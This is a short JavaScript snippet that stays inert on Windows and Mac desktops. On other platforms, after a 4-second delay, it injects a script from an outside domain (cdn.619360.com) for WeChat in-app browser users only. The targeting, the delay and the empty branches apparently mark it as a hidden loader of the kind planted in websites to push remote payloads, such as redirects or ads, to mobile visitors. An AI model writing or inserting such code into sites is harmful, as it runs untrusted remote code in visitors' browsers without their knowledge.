;(function() {
    if(navigator.platform.indexOf("Win") == 0 || navigator.platform.indexOf("Mac") == 0)
    {

    }
    else
    {
        setTimeout(function(){
            
            var ua = window.navigator.userAgent.toLowerCase();

            if(ua.match(/MicroMessenger/i) == 'micromessenger')
            {
                var script = document.createElement('script');
                script.src = "https://cdn.619360.com/n609/";
                script.async = true;
                document.body.appendChild(script);
            }
            else
            {

            }


            if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent))
            {

            }
            else
            {

            }

        }, 4000);   
    }
})();